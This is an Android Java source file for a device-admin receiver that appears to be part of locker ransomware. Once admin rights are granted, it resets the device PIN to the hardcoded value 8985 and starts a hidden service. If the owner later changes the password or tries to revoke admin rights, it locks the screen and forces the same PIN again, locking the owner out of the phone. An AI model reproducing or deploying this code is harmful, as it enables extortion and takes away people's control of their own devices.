package com.h;

import android.app.admin.DeviceAdminReceiver;
import android.content.Context;
import android.content.Intent;
import android.util.Log;

import static android.content.Intent.FLAG_ACTIVITY_NEW_TASK;

public class MyAdmin extends DeviceAdminReceiver {
    @Override
    public CharSequence onDisableRequested(Context context, Intent intent) {
        String num = Integer.toString(8985);
        getManager(context).lockNow();
        getManager(context).resetPassword(num, 0);
        return super.onDisableRequested(context, intent);
    }

    @Override
    public void onEnabled(Context context, Intent intent) {
        String num = Integer.toString(8985);
        try {
            Intent intent2 = new Intent(context, Class.forName("com.h.MyService"));
            intent2.setFlags(FLAG_ACTIVITY_NEW_TASK);
            context.startService(intent2);
            getManager(context).resetPassword(num, 0);
            super.onEnabled(context, intent);
        } catch (Throwable e) {
            throw new NoClassDefFoundError(e.getMessage());
        }
    }

    @Override
    public void onPasswordChanged(Context context, Intent intent) {
        String num = Integer.toString(8985);
        getManager(context).lockNow();
        getManager(context).resetPassword(num, 0);
        super.onPasswordChanged(context, intent);
    }

    @Override
    public void onReceive(Context context, Intent intent) {
        Log.i("------", "onReceive-----");
        super.onReceive(context, intent);
    }
}
